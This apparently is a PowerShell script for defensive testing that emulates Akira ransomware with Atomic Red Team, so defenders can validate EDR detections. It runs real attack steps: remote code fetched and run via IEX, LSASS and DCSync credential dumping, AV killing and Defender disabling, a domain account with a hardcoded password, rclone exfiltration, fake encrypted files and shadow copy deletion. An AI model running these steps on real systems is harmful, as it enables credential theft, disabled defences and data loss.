# Akira Ransomware Atomic Simulation
# Simulate Akira Ransomware tactics, techniques, and procedures (TTP) with atomic red team and some own tests to validate security controls
#
# Recommend to run without pattern based malware protection, to verify EDR behaviour based detections, otherwise pattern based AV will block most of the tools. An attacker who does obfuscation of these attack tools, wont be detected by pattern based av.
# Running without EDR will also test your system hardening settings like Windows Credential Dump Hardening settings like LSA Protect or Credential guard. 
#
# Prerequisite: https://github.com/redcanaryco/invoke-atomicredteam - works best with powershell 7
#
#
# References
# https://www.picussecurity.com/resource/blog/akira-ransomware-analysis-simulation-and-mitigation-cisa-alert-aa24-109a#how-picus-helps-simulate-akira-ransomware-attacks?


Set-ExecutionPolicy Bypass -Force

function Test-Administrator  
{  
    [OutputType([bool])]
    param()
    process {
        [Security.Principal.WindowsPrincipal]$user = [Security.Principal.WindowsIdentity]::GetCurrent();
        return $user.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator);
    }
}

if(-not (Test-Administrator))
{
    Write-Error "This script must be executed as Administrator.";
    exit 1;
}

$Logfile = $MyInvocation.MyCommand.Path -replace '\.ps1$', '.log'
Start-Transcript -Path $Logfile

if (Test-Path "C:\AtomicRedTeam\") {
   Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}
else {
  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1'); Install-AtomicRedTeam -getAtomics -Force
  Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force
}

# ------------------------
# Core Akira Simulation
# ------------------------

# T1482 - Domain Trust Discovery using nltest
Invoke-AtomicTest T1482 -TestNumbers 2

# T1069.001 - Local Groups Discovery
Invoke-AtomicTest T1069.001 -TestNumbers 2

# T1069.002 - Domain Groups Discovery
Invoke-AtomicTest T1069.002 -TestNumbers 1

# T1018 - Remote System Discovery
Invoke-AtomicTest T1018 -TestNumbers 3

# T1057 - Process Discovery
Invoke-AtomicTest T1057 -TestNumbers 2

# T1482 - Extended Domain Trust Discovery
Invoke-AtomicTest T1482 -TestNumbers 4 -GetPrereqs
Invoke-AtomicTest T1482 -TestNumbers 4 
Invoke-AtomicTest T1482 -TestNumbers 5

# T1046 - Network Service Discovery (Advanced IP Scanner)
echo "# T1046 - Network Service Discovery (Advanced IP Scanner)"
Invoke-WebRequest -Uri "https://download.advanced-ip-scanner.com/download/files/Advanced_IP_Scanner_2.5.4594.1.exe" -OutFile "C:\temp\Advanced_IP_Scanner_2.5.4594.1.exe"
C:\temp\Advanced_IP_Scanner_2.5.4594.1.exe /SP- /VERYSILENT
cmd.exe /c "C:\Program Files (x86)\Advanced IP Scanner\advanced_ip_scanner_console.exe" "/r:10.10.10.1-10.10.10.255"

# T1016 - Network Configuration Discovery
Invoke-AtomicTest T1016 -TestNumbers 1

# T1003.001 - Mimikatz LSASS Dump
Invoke-AtomicTest T1003.001 -TestNumber 6 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 6

# T1003.001 - LSASS Dump via ProcDump
Invoke-AtomicTest T1003.001 -TestNumber 1 -GetPrereqs
Invoke-AtomicTest T1003.001 -TestNumber 1

# T1555.003 - Credential Dump via LaZagne
Invoke-AtomicTest T1555.003 -TestNumber 3 -GetPrereqs
Invoke-AtomicTest T1555.003 -TestNumber 3

# T1555.003 - Chrome Credential Dump via esentutl.exe
Invoke-AtomicTest T1555.003 -TestNumber 17 -GetPrereqs
Invoke-AtomicTest T1555.003 -TestNumber 17

# T1003.005 - Cached Credential Dump via cmdkey
Invoke-AtomicTest T1003.005

# T1547.009 - Startup Shortcut Persistence
Invoke-AtomicTest T1547.009 -TestNumbers 2

# T1053.005 - Scheduled Task for Persistence
Invoke-AtomicTest T1053.005 -TestNumbers 1

# T1548.002 - UAC Bypass using ccmstp
Invoke-AtomicTest T1548.002 -TestNumbers 19

# T1558.003 - Kerberoasting with Rubeus
Invoke-AtomicTest T1558.003 -TestNumbers 2 -GetPrereqs
Invoke-AtomicTest T1558.003 -TestNumbers 2

# T1134.001 - Token Impersonation/SeDebugPrivilege
Invoke-AtomicTest T1134.001 -TestNumbers 2

# T1021.002 - PsExec Remote Execution
Invoke-AtomicTest T1021.002 -TestNumbers 3 -GetPrereqs
Invoke-AtomicTest T1021.002 -TestNumbers 3

# T1136.002 - Domain Account Creation (User: itadm)
net user itadm "T1136_pass123!" /add /domain
Invoke-AtomicTest T1136.002 -TestNumbers 1

# T1136.002 - Domain Account Creation via PowerShell
Invoke-AtomicTest T1136.002 -TestNumbers 3

# T1562.001 - Kill AV Processes with Backstab
Invoke-AtomicTest T1562.001 -TestNumbers 29 -GetPrereqs
Invoke-AtomicTest T1562.001 -TestNumbers 29

# T1562.001 - Disable Defender Variants
Invoke-AtomicTest T1562.001 -TestNumbers 16
Invoke-AtomicTest T1562.001 -TestNumbers 18
Invoke-AtomicTest T1562.001 -TestNumbers 27

# T1562.004 - Disable Windows Firewall via Registry
Invoke-AtomicTest T1562.004 -TestNumbers 2

# T1219 - Detect AnyDesk File Drop
Invoke-AtomicTest T1219 -TestNumbers 2

# T1090 - Detect ngrok Proxy Use
echo "# Test #26 - T1090 - ngrok Proxy Service"
ping -n 1 tunnel.ngrok.com
tnc tunnel.ngrok.com -port 443

# T1560.001 - Archive Files via WinRAR
Invoke-AtomicTest T1560.001 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1560.001 -TestNumbers 1
Invoke-AtomicTest T1560.001 -TestNumbers 2

# T1048.003 - Exfiltrate via Rclone to FTP
Invoke-AtomicTest T1048.003 -TestNumbers 7 -GetPrereqs
Invoke-AtomicTest T1048.003 -TestNumbers 7

# T1567.002 - Exfiltrate to Mega via Rclone
Invoke-AtomicTest T1567.002 -GetPrereqs
Invoke-AtomicTest T1567.002 

# T1486 - Simulate Ransom Note (PureLocker)
Invoke-AtomicTest T1486 -TestNumbers 5

# T1486 - Create Fake .akira Files and Drop Ransom Note
echo "# Test 31 - T1486 - Add 100 Files with .akira File Ending + Akira Ransomnote"
1..100 | ForEach-Object { $out = new-object byte[] 1073741; (new-object Random).NextBytes($out); [IO.File]::WriteAllBytes("c:\test.$_.akira", $out) }
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/FrostedDolphin/rnsmEmulation/refs/heads/main/AkiraNote.txt" -OutFile "C:\akira_readme.txt"

# T1490 - Delete Volume Shadow Copies
Invoke-AtomicTest T1490 -TestNumbers 5

# ------------------------
# Optional Extended Coverage
# ------------------------

# T1566.001 - Simulate Phishing Email with Malicious Attachment
Invoke-AtomicTest T1566.001 -TestNumbers 1

# T1083 - File and Directory Discovery
Invoke-AtomicTest T1083 -TestNumbers 1

# T1012 - Query Registry for System Discovery
Invoke-AtomicTest T1012 -TestNumbers 1

# T1087.002 - Domain Account Enumeration
Invoke-AtomicTest T1087.002 -TestNumbers 1

# T1543.003 - Create Malicious Windows Service for Persistence
Invoke-AtomicTest T1543.003 -TestNumbers 1

# T1003.006 - DCSync Credential Theft via Mimikatz
Invoke-AtomicTest T1003.006 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1003.006 -TestNumbers 1

# T1068 - Privilege Escalation via Token Exploit
Invoke-AtomicTest T1068 -TestNumbers 1

# T1070.004 - Delete Artifacts (Anti-Forensics)
Invoke-AtomicTest T1070.004 -TestNumbers 1

# T1036 - Masquerading via Renaming Executables
Invoke-AtomicTest T1036 -TestNumbers 1

# T1071.001 - HTTPS-based C2 Communication
Invoke-AtomicTest T1071.001 -TestNumbers 1

# T1041 - Exfiltration over C2 Channel
Invoke-AtomicTest T1041 -TestNumbers 1

# T1491.001 - Internal Website Defacement Simulation
Invoke-AtomicTest T1491.001 -TestNumbers 1

# T1499 - Simulate Resource Exhaustion/DoS
Invoke-AtomicTest T1499 -TestNumbers 1
